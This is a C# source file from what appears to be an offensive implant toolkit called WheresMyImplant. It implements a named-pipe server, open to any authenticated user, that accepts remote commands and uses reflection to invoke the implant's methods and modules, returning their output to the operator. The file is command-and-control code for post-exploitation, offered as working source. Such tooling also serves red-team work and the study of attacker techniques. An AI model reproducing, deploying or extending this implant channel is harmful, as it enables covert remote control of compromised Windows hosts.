using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.IO;

namespace WheresMyImplant
{
    class SMBServer
    {
        private NamedPipeServerStream namedPipeServerStream;
        private Dictionary<String, Type> mapping = new Dictionary<String, Type>();

        public SMBServer()
        {
            SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null);
            PipeAccessRule access = new PipeAccessRule(sid, PipeAccessRights.ReadWrite, AccessControlType.Allow);
            PipeSecurity pipeSecurity = new PipeSecurity();
            pipeSecurity.AddAccessRule(access);
            namedPipeServerStream = new NamedPipeServerStream("FormalChicken", PipeDirection.InOut, 100, PipeTransmissionMode.Byte, PipeOptions.None, 0, 0, pipeSecurity);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public SMBServer(String pipeName)
        {
            SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null);
            PipeAccessRule access = new PipeAccessRule(sid, PipeAccessRights.ReadWrite, AccessControlType.Allow);
            PipeSecurity pipeSecurity = new PipeSecurity();
            pipeSecurity.AddAccessRule(access);
            namedPipeServerStream = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 100, PipeTransmissionMode.Byte, PipeOptions.None, 0, 0, pipeSecurity);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        /*
        public static void StartServer()
        {
            Console.WriteLine("Starting SMB Server");
            while (true)
            {
                SMBServer smbServer = new SMBServer();
                smbServer.waitForConnection();
                smbServer.mainLoop();
            }
        }
        */
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void StartServer(String pipeName)
        {
            Console.WriteLine("Starting SMB Server");
            while (true)
            {
                SMBServer smbServer = new SMBServer(pipeName);
                smbServer.waitForConnection();
                smbServer.mainLoop();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void waitForConnection()
        {
            namedPipeServerStream.WaitForConnection();
            Byte[] buffer = recieveMessage();
            Console.WriteLine(Encoding.Unicode.GetString(buffer));
            if (Encoding.Unicode.GetString(buffer) != "PING")
            {
                return;
            }
            sendMessage("PONG");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void mainLoop()
        {
            while (true)
            {
                try
                {
                    Byte[] command = recieveMessage();
                    String strCommand = Encoding.Unicode.GetString(command);
                    Console.WriteLine(Encoding.Unicode.GetString(command));
                    String[] arrCommand = strCommand.Split('\0');
                    switch (arrCommand[0].ToLower())
                    {
                        case "modules":
                            advertiseModules();
                            break;
                        case "listmodules":
                            advertiseModules();
                            break;
                        case "methods":
                            advertiseMethods();
                            break;
                        case "listmethods":
                            advertiseMethods();
                            break;
                        case "listparameters":
                            advertiseMethodParameters(arrCommand[1]);
                            break;
                        case "usemodule":
                            //Check if exists
                            activateModule(arrCommand[1], new Object[] { }, new Object[] { });
                            break;
                        case "usemethod":
                            //Check if exists
                            activateMethod(arrCommand[1], arrCommand.Skip(1).ToArray());
                            break;
                        case "exit":
                            namedPipeServerStream.Close();
                            return;
                        default:
                            try
                            {
                                activateMethod(arrCommand[0], arrCommand.Skip(1).ToArray());
                            }
                            catch (Exception error)
                            {
                                Console.WriteLine(error);
                                sendMessage("Invalid Command");
                            }
                            break;
                    }
                    if (!namedPipeServerStream.IsConnected)
                    {
                        namedPipeServerStream.Close();
                        break;
                    }
                }
                catch (Exception error)
                {
                    Console.WriteLine(error);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void advertiseModules()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            Type[] classes = assembly.GetTypes().Where(t => t.IsClass).ToArray();
            StringBuilder sbLoadedClasses = new StringBuilder();
            foreach (Type loadedClass in classes)
            {
                sbLoadedClasses.Append(loadedClass.ToString() + "\n");
                mapping[loadedClass.ToString()] = loadedClass;
            }
            Console.WriteLine(sbLoadedClasses.ToString());
            sendMessage(sbLoadedClasses.ToString());
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://stackoverflow.com/questions/7598088/purpose-of-activator-createinstance-with-example
        ////////////////////////////////////////////////////////////////////////////////
        internal static Object activateModule<T>()
        {
            Type localType = typeof(T);
            T instance = (T)Activator.CreateInstance(localType);
            return instance;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal String activateModule(String strModule, Object[] arguments, Object[] arguments2)
        {
            ConstructorInfo ctor = mapping[strModule].GetConstructors()[0];
            Object instance = ctor.Invoke(arguments);
            mapping[strModule].GetMethod("execute").Invoke(instance, arguments2);
            return(String)mapping[strModule].GetMethod("GetOutput").Invoke(instance, new Object[] {});
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void advertiseMethods()
        {
            String[] skipMethods = {
                "System.String ToString()",
                "Boolean Equals(System.Object)",
                "Int32 GetHashCode()",
                "System.Type GetType()"};

            MethodInfo[] methods = typeof(Implant).GetMethods();
            StringBuilder sbLoadedMethods = new StringBuilder();
            foreach (MethodInfo method in methods)
            {
                if (!skipMethods.Any(method.ToString().Contains))
                {
                    sbLoadedMethods.Append(method.ToString() + "\n");
                }
            }
            Console.WriteLine(sbLoadedMethods.ToString());
            sendMessage(sbLoadedMethods.ToString());
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void advertiseMethodParameters(String method)
        {
            MethodInfo methodInfo = typeof(Implant).GetMethod(method);
            StringBuilder sbParameters = new StringBuilder();
            ParameterInfo[] parameterInfo = methodInfo.GetParameters();
            foreach (ParameterInfo parameter in parameterInfo)
            {
                sbParameters.Append(String.Format("{0}|{1}\0", parameter.Position, parameter.Name));
            }
            Console.WriteLine(sbParameters.ToString());
            sendMessage(sbParameters.ToString());
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void activateMethod(String strMethod, Object[] arguments)
        {
            Console.WriteLine("Activating: {0}", strMethod);
            Type implantType = typeof(Implant);
            MethodInfo methodInfo = implantType.GetMethod(strMethod);
            String returnValue = (String)methodInfo.Invoke(null, arguments);
            Console.WriteLine("Output: {0}",  returnValue);
            sendMessage(returnValue);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Byte[] recieveMessage()
        {
            Byte[] buffer = new Byte[sizeof(Int32)];
            namedPipeServerStream.Read(buffer, 0, sizeof(Int32));
            Int32 messageSize = BitConverter.ToInt32(buffer, 0);
            buffer = new Byte[messageSize];
            namedPipeServerStream.Read(buffer, 0, messageSize);
            return buffer;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void sendMessage(Byte[] message)
        {
            try
            {
                Byte[] buffer = new Byte[sizeof(Int32)];
                namedPipeServerStream.Write(BitConverter.GetBytes(message.Length), 0, sizeof(Int32));
                namedPipeServerStream.Write(message, 0, message.Length);
            }
            catch (IOException error)
            {
                return;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void sendMessage(String text)
        {
            try
            {
                Byte[] message = Encoding.Unicode.GetBytes(text);
                Byte[] buffer = new Byte[sizeof(Int32)];
                namedPipeServerStream.Write(BitConverter.GetBytes(message.Length), 0, sizeof(Int32));
                namedPipeServerStream.Write(message, 0, message.Length);
            }
            catch (IOException error)
            {
                return;
            }
        }
    }
}